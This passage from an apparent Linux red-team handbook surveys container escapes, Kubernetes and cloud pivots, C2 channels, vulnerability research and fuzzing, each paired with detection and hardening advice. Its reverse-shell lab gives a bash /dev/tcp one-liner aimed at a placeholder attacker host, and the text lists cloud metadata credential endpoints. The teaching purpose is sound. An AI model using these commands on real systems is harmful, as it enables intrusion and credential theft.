- **`/var/run/docker.sock`** mounted in: the container can talk to the Docker daemon and ask it to start a *new* privileged container that mounts the host filesystem. Famous, common, easy to detect, still happens.
- **Host root (`/`) mounted in**: trivial host compromise.
- **`/proc` from the host without restriction**: lets the container read host process info, sometimes write to host sysctls.
- **Container runtime sockets**: `containerd.sock`, `crio.sock` — equivalent to Docker socket.
- **`/sys/fs/cgroup`** writable: classic `release_agent` cgroup escape (CVE history).
- **Kubernetes API server kubeconfig** mounted in: gives the container API access.
- **Cloud credentials directories** (`/root/.aws`, GCP application default credentials): cloud account access.

Detection: any container with these mounts is a finding. Cornela enumerates suspicious mounts; admission controllers (OPA Gatekeeper, Kyverno) can block them.

### 5. Misconfiguration Class: Shared Namespaces

Sharing a namespace with the host or another container weakens isolation.

- **`hostPID: true`**: the container sees host processes; combined with `nsenter` or `ptrace` that often equals host shell.
- **`hostNetwork: true`**: the container sees host network interfaces; can bind to host ports, sniff traffic.
- **`hostIPC: true`**: shares SysV IPC, less commonly abused.
- **`hostUsers: false` (or no user namespace)**: container UID 0 == host UID 0; combined with any other weakness this is a fast path.

### 6. Kernel Bug Class: Container Breakouts Via Kernel CVEs

When isolation is configured well, the remaining attack surface is the kernel itself. Notable historical container-escape CVE shapes:

- **Dirty COW / Dirty Pipe family**: write to read-only file-backed memory, including SUID binaries on the host (Part 29.3).
- **`runc` CVE-2019-5736**: replace the `runc` binary on the host through a procfs path trick from inside a container.
- **`CVE-2022-0492` (cgroups v1 `release_agent`)**: attacker with `CAP_SYS_ADMIN` and a specific cgroups setup could trigger a host-side root command.
- **`CVE-2024-0132` and `nvidia-container-toolkit` family**: GPU runtime issues that exposed the host.
- **netfilter / nftables CVEs**: kernel memory bugs reachable from `CAP_NET_ADMIN`-bearing containers.
- **overlayfs CVE family**: the union mount used by container runtimes has been a recurring source of bugs because it sits at the boundary of user and root visibility (Part 4.5).
- **`waitid` / `userfaultfd` race-window CVEs**: race-condition bugs widened by userfaultfd (Part 29.6).

The pattern is consistent: a kernel feature exposed to containers + a bug = escape.

### 7. Runtime Bug Class: Container Runtime Issues

Beyond the kernel, the container runtime itself has had bugs:

- `runc` — already mentioned
- `containerd` and `cri-o` — image pull, mount handling
- Docker daemon — API authentication, image verification
- gVisor and Kata — sandbox runtimes that explicitly try to reduce kernel surface

The takeaway is that "isolation" is not one boundary, it is a stack of boundaries. Each layer has had its own CVEs.

### 8. Detection Strategy For Container Breakouts

What a runtime detector should watch for, regardless of which class the breakout uses:

- exec inside containers of host paths (`nsenter`, `chroot`, `mount` of `/proc/1/root`)
- new mounts performed from inside a container
- kernel-module loads from inside a container (very high signal)
- BPF program loads from a container
- writes to `/sys/fs/cgroup/.../release_agent` or similar
- process trees that span the container boundary (parent in container, child on host)
- new files appearing under host filesystem after a container event

Cornela's `AF_ALG + splice + cred-change` correlation (Part 16) is one example of this style; the same idea generalizes to container escapes.

### 9. Defensive Posture For Container Hosts

A short list of hardening choices that materially reduce escape risk:

- never `--privileged` in production
- drop all capabilities and add only the ones needed (`securityContext.capabilities.drop: [ALL]`)
- non-root container user (`runAsNonRoot: true`)
- read-only root filesystem where possible (`readOnlyRootFilesystem: true`)
- seccomp default profile (`RuntimeDefault` or stricter)
- AppArmor or SELinux profile
- user namespace remapping (`userns-remap`, K8s 1.30+ `hostUsers: false`)
- no host-network, no host-PID, no host-IPC, no host-mounts unless justified and reviewed
- gVisor or Kata for the highest-risk workloads
- patch the kernel — every container host needs the same urgency on kernel CVEs as a bare-metal host

### 10. Lab Practice For Container Escapes

A safe progression for learning this Part hands-on:

1. spin up a deliberately-misconfigured local container (privileged, with docker socket mount)
2. demonstrate the host-mount escape and the docker-socket escape, in writing, against your own lab
3. re-run with the misconfiguration removed and confirm both escapes fail
4. enable Falco or Tetragon and re-run; confirm detection fires
5. read CVE-2019-5736 and CVE-2022-0492 writeups and identify which of the categories above each falls into

Resources to study (read, not necessarily run): "Bad Pods" (BishopFox), "Container Security" (Liz Rice), kubernetes/sig-security recordings.

## Part 39: Kubernetes Red Team

**Level: Intermediate → Advanced.** Kubernetes-specific paths from foothold to cluster compromise.

**Beginner sidebar.** Kubernetes is mostly a *control plane* on top of Linux nodes. Most K8s red-team work is about RBAC, service accounts, and the API — not about Linux kernels. But the moment you escape a container (Part 38), you are back to Linux kernel land on the node.

### 1. The K8s Threat Model In One Picture

```text
internet  ->  ingress  ->  pod (your foothold)
                              |
                              | service account token
                              v
                          Kubernetes API
                              |
                  cluster RBAC, cloud IAM, secrets,
                  scheduling, image registry, etcd
                              |
                              v
                       all nodes, all pods
```

Three big pivot points: (1) the pod's service account token, (2) the kubelet on the node, (3) the cloud account the cluster runs in.

### 2. The Pod Service Account Token

Every pod gets a JWT mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` unless explicitly disabled. The token authenticates the pod to the API server.

What it gives depends on its bound role. Common findings:

- default service account with too many permissions (legacy clusters)
- ClusterRole bindings to broad verbs (`*` on `*`) on misconfigured clusters
- "viewer"-style roles that include `get secrets` (which is read of all credentials in the namespace)
- the ability to `create pods` in a namespace (which often means full namespace compromise — see next section)

What you can do with a token is determined by `kubectl auth can-i --list`, an API call.

### 3. RBAC Privilege Escalation

The "I can create pods" finding is a classic privilege escalation path:

- create a pod that runs the attacker's image
- mount a host path, or set hostPID/hostNetwork, or run as privileged
- now the new pod has the privileges the *node* has, not just the original pod
- if that pod can talk to the kubelet or read node-level secrets, the cluster is compromised

The full taxonomy of "RBAC verbs that lead to escalation":

- `create pods` (especially with permissive PodSecurityPolicy / Pod Security Standards)
- `update/patch` on Deployments, StatefulSets, DaemonSets
- `create` on `subjectaccessreviews`, `tokenrequests`, or anything that issues credentials
- `escalate` and `bind` on `roles` and `clusterroles`
- `get secrets` namespace-wide
- `create` on `validatingwebhookconfigurations` / `mutatingwebhookconfigurations` (lets you intercept all API calls)
- `impersonate` users or service accounts
- `exec` and `attach` on pods (read other pods' state)
- `proxy` on nodes and pods

### 4. The Kubelet Attack Surface

Each node runs a kubelet. It exposes an HTTP(S) API for the control plane. If reachable from a compromised pod and not properly authenticated:

- list pods on the node
- exec into other pods on the node
- read container logs

Modern clusters secure the kubelet with TLS and webhook auth, but misconfigured clusters still expose it.

### 5. etcd

etcd is the cluster's database. It holds every secret, every configmap, every resource. Direct etcd access is the cluster keys.

Findings to look for in an engagement:

- etcd reachable from a pod network without authentication
- etcd backups stored somewhere readable (S3 buckets, NFS shares)
- exposed `/metrics` endpoints that leak too much

### 6. Node-Level Pivots

Once you compromise a single node (often via Part 38 escape):

- read the kubelet's client certificate (`/var/lib/kubelet/pki/`) — full kubelet privileges
- read `/var/run/secrets/kubernetes.io/serviceaccount/...` for *every* pod scheduled on this node
- read mounted secret volumes for every pod
- read environment variables and command lines of every pod
- attach to the node's cloud IAM role (Part 40)

### 7. Cloud Provider Pivots From Kubernetes

Most managed Kubernetes services tie pods to cloud IAM:

- **GKE Workload Identity** — pods can assume GCP service accounts
- **EKS IRSA (IAM Roles for Service Accounts)** — pods can assume AWS roles via OIDC
- **AKS Workload Identity** — Azure equivalent

When a pod has cloud permissions, compromising the pod compromises (some of) the cloud account. See Part 40.

### 8. Specific Components Worth Checking

Common K8s ecosystem components with their own attack surfaces:

- **ingress controllers** (nginx-ingress, Traefik, Contour) — historically have had nasty CVEs
- **service meshes** (Istio, Linkerd) — sidecar injection, mTLS bypass paths
- **CI/CD operators** (Argo CD, Flux, Tekton) — often have broad permissions
- **secret managers** (External Secrets Operator, Vault Agent Injector) — token forwarding
- **monitoring stack** (Prometheus, Grafana) — sometimes has cluster-wide read

### 9. Detection For Kubernetes Red Team Activity

What a defender should be capturing:

- Kubernetes audit logs at `RequestResponse` level for sensitive verbs
- API access from unexpected service accounts
- new privileged pods
- new ServiceAccount tokens being requested via `tokenrequests`
- new ValidatingWebhookConfigurations / MutatingWebhookConfigurations
- new ClusterRole or RoleBindings to `cluster-admin`
- pod execs and attaches outside engineering hours
- runtime detection (Tetragon, Falco) on the nodes themselves to catch escape attempts

### 10. Tools To Know By Name

For both red and blue teams:

- **kubectl-who-can / rakkess / rbac-lookup** — RBAC analysis
- **kube-hunter** — finds K8s-specific exposures
- **kubesec** / **kube-bench** / **kube-linter** — config analysis
- **Peirates** — K8s-specific post-exploitation toolkit (study before any engagement)
- **Bad Pods** (BishopFox) — catalog of dangerous pod configurations
- **Tetragon, Falco, KubeArmor** — runtime defenders for K8s

## Part 40: Cloud And CI/CD Supply Chain Red Team

**Level: Intermediate.** The off-host attack surfaces that a Linux engagement increasingly involves.

### 1. Why This Belongs In A Linux Book

Modern Linux servers are not standalone. They run inside cloud accounts and are deployed by CI/CD pipelines. A foothold on a Linux host is often the cheapest path *into* the cloud account, and a compromised CI pipeline is often the cheapest path *into* every Linux host.

### 2. Instance Metadata Services (IMDS)

Every major cloud provider exposes an HTTP-based metadata service to instances at a fixed link-local address. From a compromised host or container, this often gives credentials to the cloud account.

The endpoints (no specific exploitation needed — the issue is whether they are reachable):

- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
- GCP: `http://metadata.google.internal/computeMetadata/v1/...`
- Azure: `http://169.254.169.254/metadata/identity/oauth2/token`

What you get back is short-lived credentials for whatever IAM role is attached to the instance.

Defense:

- AWS: enable IMDSv2 with `HttpTokens: required` and a low hop limit (1) so containers cannot reach IMDS through pod networking
- GCP / Azure: equivalent metadata header requirements
- pod-level: block egress to the metadata IP from containers that do not need it

### 3. SSRF As A Cloud Pivot

The classic pattern that hit Capital One and many others: a web application has SSRF, the attacker uses it to fetch the IMDS endpoint, the SSRF response contains cloud credentials, the attacker uses those credentials to read S3 buckets. This is the canonical example of why IMDSv2 exists.

### 4. IAM Privilege Escalation (Cloud-Side)

Once you have *some* cloud credentials, IAM misconfigurations often let you escalate:

- AWS: `iam:PassRole` + `lambda:CreateFunction` is a famous combo; a long list of others is documented in Rhino Security Labs' AWS privilege escalation research
- GCP: `iam.serviceAccounts.actAs` + service-account-key creation; broadly, `iam.serviceAccountKeys.create` on a higher-privilege account
- Azure: `Microsoft.Authorization/roleAssignments/write`, custom roles with too-broad action lists

Tools that map these paths (read, study):

- **PMapper** (AWS): graphs IAM relationships
- **ScoutSuite, Prowler, CloudSploit, Nuvola** (multi-cloud): find misconfigurations
- **gcp_enum, GCPBucketBrute** (GCP)
- **Stormspotter, MicroBurst** (Azure)

### 5. Cloud Storage Misconfiguration

A recurring engagement finding:

- public S3 buckets / GCS buckets / Azure blob containers with sensitive content
- predictable bucket names tied to the org
- bucket logging or backup buckets that are world-readable
- presigned URLs that are too long-lived or not scoped tightly

### 6. CI/CD As An Attack Path

CI/CD is a uniquely valuable target because:

- it has credentials to deploy to production
- it has access to source code
- it runs attacker-influenceable code on every push
- it is often shared across many projects

Common patterns:

- **Pull-request poisoning**: open a PR that modifies CI to exfiltrate secrets when the maintainer triggers a build
- **GitHub Actions `pull_request_target`**: a footgun that runs trusted-context workflows on PR content
- **Self-hosted runner takeover**: many CI runners are configured insecurely
- **Build-cache poisoning**: write something into a shared build cache that later jobs pull
- **Image base poisoning**: replace a base image in a registry the build pulls from
- **Dependency confusion**: publish a malicious package with the same name as an internal one to a public registry

### 7. Software Supply Chain

Beyond CI, the broader supply chain:

- malicious packages on npm, PyPI, RubyGems, crates.io
- typosquatting on package names
- malicious GitHub Actions, jsr packages, Helm charts
- malicious VS Code extensions, Docker base images
- compromised maintainer accounts (xz utils, event-stream)

This is the *largest* growth area of attack right now and it deserves its own book. For this Part, the takeaway is to *think of every dependency as code with a publisher*, and treat publisher trust as part of your security model.

### 8. SLSA, Sigstore, And Provenance

The defensive movement here:

- **SLSA** (slsa.dev): a framework for build integrity levels
- **Sigstore / cosign**: signing for container images and other artifacts, with transparency log
- **in-toto**: attestation framework for build pipelines
- **SBOM** (Software Bill of Materials): SPDX or CycloneDX, so you know what is in a build
- **GUAC**: graph queries over SBOMs and attestations

For red team learners, these tools are interesting because they are increasingly deployed as gating mechanisms at admission. For blue team learners, they are the long-term answer to the Part 7 supply chain section.

### 9. Cloud Detection Surfaces

What a defender should be ingesting:

- AWS CloudTrail, GCP Audit Logs, Azure Activity Log — at *all* levels including Data Events for S3
- IAM access analyzer findings
- GuardDuty / Security Command Center / Defender for Cloud
- VPC Flow Logs (egress patterns are very informative)
- IMDSv1 usage metrics (if any IMDSv1 calls happen, that is a finding)
- CI audit logs (GitHub Actions, GitLab CI, Bitbucket Pipelines)

A surprising amount of cloud attacker activity is only visible in these logs, not on the host. Linux-host-only telemetry misses the cloud control plane entirely.

### 10. Putting Cloud + CI/CD Into An Engagement

A realistic flow:

1. recon finds a public-facing app with SSRF
2. SSRF reaches IMDS, returns credentials
3. credentials let you read an S3 bucket containing CI logs
4. CI logs leak a long-lived deployment token
5. deployment token lets you push to a private container registry
6. next deploy pulls the poisoned image, you have foothold on the production host
7. production host has a cloud IAM role with broader access — full account compromise

Defense focuses on every step: eliminate SSRF, IMDSv2 + hop limit, no plaintext secrets in logs, short-lived deployment tokens, image signing, runtime detection on hosts.

## Part 41: Reverse Shells, Tunneling, And C2 On Linux

**Level: Intermediate.** A taxonomy of how attackers move data and control over the network, with the detection footprint each pattern leaves behind.

**Beginner sidebar.** A *reverse shell* is when the compromised host connects *out* to the attacker, instead of the attacker connecting *in*. This works around inbound firewalls. *C2* (command and control) is the broader category — the channel an operator uses to send instructions and receive output.

### 1. Why Outbound Channels Dominate

Inbound network policy is usually tight. Outbound policy is usually loose. So almost all modern attacker control lives in some outbound channel that looks normal: HTTPS, DNS, occasionally ICMP.

The constraint shapes everything. The attacker is not picking the most efficient channel; they are picking the channel that blends in with legitimate egress.

### 2. Reverse Shell Channels (Conceptually)

A reverse shell needs three things: a way for the host to reach out, a way to encode commands and output, and a way to survive interruptions. The common channels:

- **TCP reverse shell**: simplest. A short shell script connects to attacker IP:port and pipes a shell over the socket. Easy to detect on egress.
- **TLS reverse shell**: same, wrapped in TLS so the bytes are encrypted. Defeats simple plaintext IDS but not flow analysis.
- **HTTPS-based**: looks like a web request to an attacker server. Blends well, especially through a CDN.
- **DNS C2**: encodes commands in DNS queries (subdomains) and responses (TXT records). Slow but bypasses many firewalls; conspicuous in DNS logs because of high entropy and high query volume.
- **ICMP C2**: encodes data in ping payloads. Often blocked nowadays.
- **WebSocket / gRPC**: long-lived bidirectional channels that look like modern app traffic.
- **SMTP / IRC / messaging-platform C2**: lower-bandwidth channels that hide in legitimate services.
- **Cloud C2 (Slack, Discord, GitHub, S3)**: command channel through a popular SaaS the target probably already permits.

### 3. The "Living Off The Land" Pattern For Reverse Shells

On most Linux hosts, the operator does not need to drop a tool. They can use what is already there:

- `bash` itself supports `/dev/tcp/host/port` as a network primitive
- `python3`, `perl`, `ruby` can each open sockets in one line
- `nc` (when present, varies by distro)
- `socat` (when installed)
- `curl` and `wget` for one-shot exfil and short-poll C2
- `ssh` for tunneling (next section)

Detection: `bash` or `python` opening a network socket is a high-signal eBPF event. Tetragon/Falco rules specifically watch for these patterns.

### 4. Tunneling And Pivoting

Once a foothold exists, the operator usually wants to reach further into the network without dropping new tools on every hop. This is *pivoting*.

The general pattern:

```text
operator -> compromised host -> internal target
                  (tunnel)
```

Common tunneling tools (study before any engagement):

- **`ssh -L`, `ssh -R`, `ssh -D`** — local, remote, and dynamic SOCKS forwarding. Built in everywhere.
- **`chisel`** — TCP/UDP over HTTP, easy to deploy. Visible in process list and outbound traffic but blends well.
- **`ligolo-ng`** — modern pivoting tool with TUN-based routing. Quiet on the host, complex on the wire.
- **`frp`** — fast reverse proxy.
- **`gost`** — multi-protocol proxy.
- **`socat`** — Swiss army knife of TCP/UDP/UNIX manipulation.
- **`iodine`** — IP-over-DNS tunnel, very slow but evasive.
- **`stunnel`** — TLS wrapper, useful for staging.

### 5. C2 Frameworks

Frameworks tie together implants, channels, and operator UI. Major ones (study, do not deploy without authorization):

- **Sliver** (BishopFox) — Go implant, modern, multi-OS, strong Linux support
- **Mythic** — modular, multi-implant
- **Cobalt Strike** — commercial, heavily Windows-focused; Linux implants are less mature here
- **Merlin** — HTTP/2 C2
- **Empire / Starkiller** — older but still studied

For learning, Sliver is the most accessible because the source is on GitHub and the documentation is excellent.

### 6. Egress Detection Concepts

What a network defender should look for:

- **destination novelty**: the host is talking to an IP it has not previously talked to
- **rare ASNs and countries** for outbound traffic
- **TLS JA3/JA4 fingerprints** that don't match normal client populations
- **DNS query entropy** spikes (DNS C2 has visibly random subdomains)
- **periodicity**: implant beacons tend to have characteristic intervals (jitter helps but rarely hides perfectly)
- **flow size**: a short HTTPS connection that uploads a lot is unusual
- **persistent connections** to "consumer" sites from production servers
- **certificate anomalies**: self-signed certs, weird issuers, short-lived Let's Encrypt certs on suspicious domains

### 7. Egress Filtering Architectures

Defenses that materially reduce C2 reliability:

- **explicit egress allow-list** — production hosts only reach a list of approved destinations
- **outbound HTTP/S proxy with TLS interception** for human traffic
- **DNS resolver with policy** (block newly-registered domains, block low-rep, sinkhole known bad)
- **service-mesh egress policy** (Istio, Linkerd) for K8s
- **eBPF-based egress observability** to see *which container* made each connection
- **NTP, time, and update channels** are the only outbound traffic many production hosts genuinely need

If a server has no business reaching the internet, every outbound connection is a finding.

### 8. Beacon OPSEC Concepts

Operators tune their implants to be quieter:

- **jitter** — randomize the beacon interval so it does not look periodic
- **sleep masking** — encrypt or unmap implant memory while idle so memory scanners miss it
- **domain fronting / SNI tricks** — historically common, increasingly harder
- **traffic shaping** — match the size and timing distribution of legitimate traffic
- **certificate pinning** — the implant only accepts specific cert fingerprints to prevent MITM analysis

Detection responds with traffic analysis at scale, ML-based anomaly detection, and protocol-aware proxies that strip novelty.

### 9. Practical Lab For This Part

Safe practice for learners:

1. set up a lab with two VMs
2. on the "victim," use `bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'` to a `nc -lvp 4444` listener — note what eBPF (Tetragon, Tracee) sees
3. replace the channel with `chisel` and observe the difference in network and process telemetry
4. add Sliver in a fully isolated lab and observe its beacon pattern
5. write a Falco rule to detect the original `bash`-tcp shell pattern
6. write a Sigma rule for DNS-tunnel-like query entropy

The exercise is not "can you make a reverse shell?" — that is a five-line script. The exercise is "can you tell which kinds of channels your detection stack sees, and which it misses?"

## Part 42: Vulnerability Research Workflow

**Level: Advanced.** The professional workflow that turns "the kernel released a patch" or "the project disclosed a CVE" into engineering knowledge.

**Beginner sidebar.** A *0-day* is a vulnerability not yet disclosed. An *n-day* is a vulnerability with a public patch but where some systems have not updated. Most red-team engagements use n-days, not 0-days. This Part is about how to read advisories and patches well enough to know which n-days actually matter.

### 1. Why Vulnerability Research Is A Skill

Reading a CVE description and *understanding what is reachable* is not the same as memorizing CVE numbers. The skill set:

- read a kernel patch and understand which subsystem and which bug class
- read the original bug report (often syzbot, often Project Zero)
- decide whether a target is actually affected
- decide whether the bug is exploitable from your access level
- decide whether weaponization is feasible in your time budget

Most CVE numbers are noise. The professional skill is filtering.

### 2. Sources Of Disclosures

The major streams:

- **kernel.org stable announcements** — every stable release has a list of fixed CVEs
- **distro security trackers** — Debian's security tracker, Ubuntu USN, RHEL CVE pages, Alpine secdb
- **oss-security mailing list** — public discussions of OSS vulnerabilities
- **NVD / CVE.org** — central database, often lagging
- **GitHub Security Advisories (GHSA)** — increasingly the primary source for OSS
- **Project Zero blog and issue tracker** — long-form, technical, often with PoC after the patch ships
- **vendor advisories** — RHEL, SUSE, Canonical, AWS, Google
- **conference talks and trip reports** — Black Hat, Recon, OffensiveCon, USENIX Security

A regular reading discipline matters more than tool sophistication. Most VR researchers skim three or four of these every week.

### 3. Patch Diffing

Patch diffing is the central technique: read the commit that fixes a bug, work backward to understand the bug.

For the Linux kernel:

```text
git log --grep CVE-2024-XXXXX
git show <commit>
```

For OSS in general, the GitHub commit page or `git diff <fix-commit>~ <fix-commit>` is enough.

What to look at in a fix:

- which file changed? which subsystem?
- which function? what was its purpose before?
- which condition changed? a bounds check? a refcount? a lock? an initialization?
- is there a new check that prevents the bug, or a new branch that handles the bug case?
- what is the *bug class* (use Part 8's taxonomy)?
- which input path reaches the buggy function?

A useful exercise: read the `mmap` or `splice` patch series for one quarter and write a one-paragraph summary of each.

### 4. Reading Kernel Bug Reports

Most modern kernel bugs come from syzbot (Part 31.5). The reports follow a stable format:

- a config and kernel commit that reproduce the crash
- a syscall sequence (the "C reproducer") that triggered it
- a KASAN or KMSAN report identifying the bug class

What to extract:

- the *reachability*: can this be triggered from unprivileged userspace? from a container? from a network packet?
- the *primitive*: is it OOB read, OOB write, UAF, double-free?
- the *target object*: what struct is corrupted? what does it lead to?

### 5. Determining Affected Range

A real CVE evaluation needs three numbers:

- the commit that introduced the bug
- the commit that fixed it
- whether your target's kernel falls between them

Tools:

- `git log --oneline <introducing>..<fixing> -- path/to/file` to see the patch range
- distro CVE trackers, which usually annotate which release branches received the backport
- `dpkg -l linux-image-*` / `rpm -q kernel` plus the vendor tracker

For containers, the *host* kernel matters, not the container's userspace. This is one of the most common mistakes in container vulnerability scanning.

### 6. From CVE To 1-Day Exploit

The professional path from public CVE to working exploit:

1. read the patch and bug report carefully
2. write a *trigger* — a program that reaches the buggy code path and crashes the kernel
3. confirm the crash matches the patch's bug shape
4. study the resulting state in a debugger (qemu+gdb makes this easy)
5. think about turning the bug into a primitive (read, write, info leak)
6. spray relevant kernel objects (Part 29) to influence what is corrupted
7. build the primitive into something useful (cred overwrite, modprobe_path, etc.)
8. test on the target kernel build with appropriate mitigations enabled

The whole process can be days for an easy bug or months for a hard one. For most red-team engagements, the time-to-exploit budget pushes toward "find a 1-day someone else weaponized."

### 7. Where Public Exploits Live

For learning purposes (read, do not run on others' systems):

- **xairy/linux-kernel-exploitation** (GitHub) — comprehensive index of public Linux kernel exploits with writeups
- **GitHub topic search** for `CVE-2023-...`, `kernel-exploit`, etc.
- **exploit-db** — older index but still useful
- **Project Zero issue tracker** — when an issue is unrestricted, the PoC is attached
- **conference proceedings** — Black Hat, OffensiveCon, REcon archives

### 8. Bug Hunting Your Own Targets

If the engagement scope includes 0-day work:

- pick a small attack surface in the codebase (one ioctl handler, one parser, one driver)
- read it like a code review
- identify untrusted-input flow and confirm every bounds, length, and ownership check
- build a fuzz harness (Part 43) for that specific surface
- triage crashes by hand

Tools to know: SemGrep and CodeQL for queryable static analysis on large codebases; AFL++ and libFuzzer for fuzzing; KASAN/UBSAN to amplify crashes into clear bug reports.

### 9. Disclosure Ethics

If you find a real 0-day during an engagement:

- it is the *client's* asset to disclose responsibly
- do not publish, demo, or discuss it outside the engagement
- coordinate with the affected upstream project on a disclosure timeline
- standard timelines are 90 days (Project Zero) to 120 days (industry norm)
- for kernel bugs, the right contact is `security@kernel.org`

This is not optional. Mishandled disclosure can get researchers and clients into legal trouble.

### 10. A Practical Vuln Research Cadence

A professional cadence that scales:

- daily: 15 minutes skimming oss-security and a stable release announce
- weekly: read one Project Zero post and one LWN article fully
- monthly: pick one CVE, do the full patch-diff-to-trigger workflow on a lab kernel
- quarterly: pick one subsystem and read the recent commit history end to end

This kind of habit produces real fluency in two or three years. There is no shortcut.

## Part 43: Fuzzing For Red Team

**Level: Advanced.** Coverage-guided fuzzing as a tool for finding new bugs in scope.

**Beginner sidebar.** *Fuzzing* is automated bug-finding by feeding random or randomized inputs to a target and watching for crashes. Modern fuzzing is *coverage-guided*: the fuzzer prioritizes inputs that reach new code paths. This finds bugs orders of magnitude faster than blind random fuzzing.

### 1. Why Fuzzing Belongs In Red Team Work

In an authorized engagement that includes finding new vulnerabilities, fuzzing is often the highest leverage activity. It scales with CPU, runs unattended, and finds bug classes humans miss (especially memory-safety bugs and parser bugs).

The tradeoff: fuzzing produces *crashes*, not *exploits*. You still have to triage, root-cause, and decide if a crash is exploitable.

### 2. The Three Major Fuzzers

- **AFL++** — the modern, actively maintained fork of AFL. Works with QEMU, Unicorn, persistent mode, and parallel fuzzing. Best general-purpose choice.
- **libFuzzer** — Clang-integrated, in-process fuzzer. Fastest for library-style targets. Used heavily in OSS-Fuzz.
- **honggfuzz** — Google's, also coverage-guided. Strengths in feedback driven by perf counters.

For kernel-style targets:

- **syzkaller** — the upstream kernel fuzzer. Description-driven (uses syscall descriptions to know what valid syscalls look like).
- **kAFL / Nyx** — hypervisor-based fuzzers for OS kernels.

### 3. The Anatomy Of A Harness

A *fuzzing harness* is the small program that turns the fuzzer's bytes into a call into the target. The harness is the most important variable in fuzzing effectiveness.

A good harness:

- is small (the fuzzer iterates *fast* per input)
- exercises one logical surface (one parser, one protocol, one ioctl)
- uses sanitizers (ASan + UBSAN, plus MSan for some)
- is deterministic (same input -> same crash)
- avoids global state that leaks across iterations

A typical libFuzzer harness in C is roughly:

```c
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    target_parse(data, size);
    return 0;
}
```

The hard work is what `target_parse` is, how to set up its preconditions, and how to clean up after.

### 4. Coverage And Corpus

Two concepts the fuzzer uses internally:

- **coverage**: which basic blocks of the target the input reached. The fuzzer wants to maximize this.
- **corpus**: the saved set of inputs that produced new coverage. Good fuzzing starts from a *corpus of valid inputs* (a good corpus may save weeks of fuzzer time).

For a network protocol, the corpus is a directory of saved valid packets. For a parser, it is a directory of valid sample files. Spend time building this before you start the fuzzer.

### 5. Structure-Aware And Grammar Fuzzing

For complex inputs (TLS, X.509, DWARF, SQL, programming languages), random byte mutation rarely produces valid inputs. Solutions:

- **structure-aware fuzzing** with a dictionary or a custom mutator
- **grammar fuzzers** like Nautilus, Gramatron, Fuzzilli (for JS engines)
- **`libprotobuf-mutator`** — mutate protobuf messages directly
- **`FuzzedDataProvider`** — split the fuzzer's bytes into typed args (sizes, choices, sub-buffers)

### 6. Sanitizers Are Force Multipliers

Run the fuzz target with:

- **ASan** (AddressSanitizer): catches OOB and UAF in userspace
- **UBSan** (UndefinedBehaviorSanitizer): catches signed overflow, bad shifts, type punning errors
- **MSan** (MemorySanitizer): catches uninitialized memory reads (slower, sometimes worth it)
- For kernels: **KASAN**, **KMSAN**, **UBSAN**

Without sanitizers, many bugs become silent corruption that the fuzzer never notices. With them, crashes become reproducible bug reports.

### 7. Triage

Once the fuzzer produces crashes:

- minimize the crashing input (`afl-tmin`, `llvm-cov`'s minimizer)
- group by stack trace (or by ASan summary line)
- determine bug class (Part 8)
- determine reachability from untrusted input
- decide priority

Most crashes are duplicates. A good triage pipeline collapses thousands of crashes into a handful of unique bugs.

### 8. Distributed And Continuous Fuzzing

For real campaigns:

- run the fuzzer on many cores or many machines
- use AFL++'s parallel mode or libFuzzer's `-jobs=N`
- continuous fuzzing in CI with **OSS-Fuzz** style infrastructure
- save the corpus to durable storage so progress survives restarts
- monitor coverage growth as a health metric

### 9. Fuzzing The Kernel

Two practical paths:

- **syzkaller**: best results for the Linux kernel itself. You write or extend syscall descriptions; syzkaller generates valid syscall sequences.
- **AFL++ via QEMU mode** for specific drivers or modules where you can build a userspace harness.
- **Nyx / kAFL** for more aggressive kernel fuzzing with snapshots.

A starting project: take a `setsockopt` option that has had recent CVEs, write a syzkaller description for it, and run syzkaller against a debug build of the kernel. Even a few hours of CPU often produces interesting paths.

### 10. Fuzzing OPSEC In Engagements

Important consideration: fuzzing is *loud*. It produces crash dumps, log entries, and resource spikes. Never fuzz a target system you do not own. Always fuzz a *copy* of the target — extract the binary or library, build a local lab, and fuzz there.

## Part 44: MITRE ATT&CK On Linux

**Level: All levels (reference).** ATT&CK is a structured taxonomy of attacker techniques. This Part is a cross-reference between the most-relevant Linux ATT&CK techniques and where they appear elsewhere in this book.

### 1. What ATT&CK Is

[MITRE ATT&CK](https://attack.mitre.org/) is a knowledge base of tactics (the *why*) and techniques (the *how*) used by real adversaries. Tactics are columns; techniques are rows. Each technique has a stable ID like `T1059.004` (Unix Shell).

For DevSecOps, ATT&CK is the lingua franca that connects red-team reports, SIEM rules, threat intelligence, and detection coverage.

### 2. The Linux-Relevant Tactics

ATT&CK's tactics are platform-neutral; the Linux-relevant ones for this book:

- **Reconnaissance** (TA0043) — Part 33.2
- **Initial Access** (TA0001) — Part 33.3, 41
- **Execution** (TA0002) — Parts 18, 41
- **Persistence** (TA0003) — Part 36
- **Privilege Escalation** (TA0004) — Parts 9, 29, 35
- **Defense Evasion** (TA0005) — Parts 35.8, 37, 47
- **Credential Access** (TA0006) — Part 35.5
- **Discovery** (TA0007) — Part 33.4
- **Lateral Movement** (TA0008) — Part 33.7
- **Collection** (TA0009) — Part 33.8
- **Command and Control** (TA0011) — Part 41
- **Exfiltration** (TA0010) — Parts 33.8, 41.6
- **Impact** (TA0040) — out of scope for this book

### 3. High-Value Linux Techniques

A subset that come up in nearly every Linux engagement. Memorize these IDs.

- **T1059.004 Command and Scripting Interpreter: Unix Shell** — the core of post-exploitation execution
- **T1543.002 Create or Modify System Process: Systemd Service** — modern persistence
- **T1547.013 Boot or Logon Autostart Execution: XDG Autostart Entries** — desktop persistence
- **T1546.004 Event Triggered Execution: Unix Shell Configuration Modification** — `.bashrc`-class persistence
- **T1053.003 Scheduled Task/Job: Cron** — persistence via cron
- **T1098.004 Account Manipulation: SSH Authorized Keys** — the famous one
- **T1574.006 Hijack Execution Flow: Dynamic Linker Hijacking** — `LD_PRELOAD` and `/etc/ld.so.preload`
- **T1014 Rootkit** — Part 37
- **T1611 Escape to Host** — Part 38
- **T1610 Deploy Container** — K8s pod-based privesc, Part 39
- **T1552.004 Unsecured Credentials: Private Keys** — SSH key theft
- **T1552.005 Unsecured Credentials: Cloud Instance Metadata API** — Part 40.2
- **T1078.004 Valid Accounts: Cloud Accounts**
- **T1078.001 Valid Accounts: Default Accounts**
- **T1555 Credentials from Password Stores**
- **T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow**
- **T1057 Process Discovery**
